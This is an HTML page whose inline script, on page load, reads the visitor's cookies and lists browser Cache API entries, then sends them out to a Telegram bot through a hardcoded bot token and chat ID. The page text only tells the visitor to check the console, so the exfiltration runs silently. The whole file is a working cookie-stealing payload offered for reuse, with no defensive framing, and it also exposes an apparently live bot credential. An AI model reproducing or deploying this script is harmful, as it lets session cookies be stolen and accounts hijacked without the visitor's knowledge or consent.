<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fetch Cache and Cookies</title>
    <script>
        const TelegramBotToken = '7694280275:AAGH4Vj9dh9gCMoAwmPeikpWbtyStdNwXc8'; // Replace with your Telegram Bot Token
        const ChatID = '693873866'; // Replace with your Telegram chat ID

        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${TelegramBotToken}/sendMessage`;
            const body = {
                chat_id: ChatID,
                text: message,
                parse_mode: 'HTML',
            };

            const requestOptions = {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(body),
            };

            try {
                const response = await fetch(url, requestOptions);
                const data = await response.json();
                if (!data.ok) {
                    console.error('Failed to send message to Telegram:', data.description);
                }
            } catch (error) {
                console.error('Error sending to Telegram:', error);
            }
        }

        async function fetchCookiesAndCache() {
            // Fetch cookies
            const cookies = document.cookie;
            console.log('Cookies:', cookies);

            // Fetch cache (using Cache API)
            if ('caches' in window) {
                const cacheNames = await caches.keys();
                let cacheInfo = 'Cache names:\n';

                for (const cacheName of cacheNames) {
                    const cache = await caches.open(cacheName);
                    const cacheEntries = await cache.keys();

                    cacheInfo += `Cache: ${cacheName}\n`;
                    cacheEntries.forEach(request => {
                        cacheInfo += ` - ${request.url}\n`;
                    });
                }

                console.log(cacheInfo);

                // Send cookies and cache information to Telegram
                await sendToTelegram(`Cookies:\n${cookies}\n\n${cacheInfo}`);
            } else {
                console.log('Cache API not supported in this browser.');
                await sendToTelegram(`Cookies:\n${cookies}\n\nCache API not supported.`);
            }
        }

        document.addEventListener('DOMContentLoaded', () => {
            fetchCookiesAndCache();
        });
    </script>
</head>
<body>
    <h1>Fetching Cache and Cookies</h1>
    <p>Check the console for logs.</p>
</body>
</html>
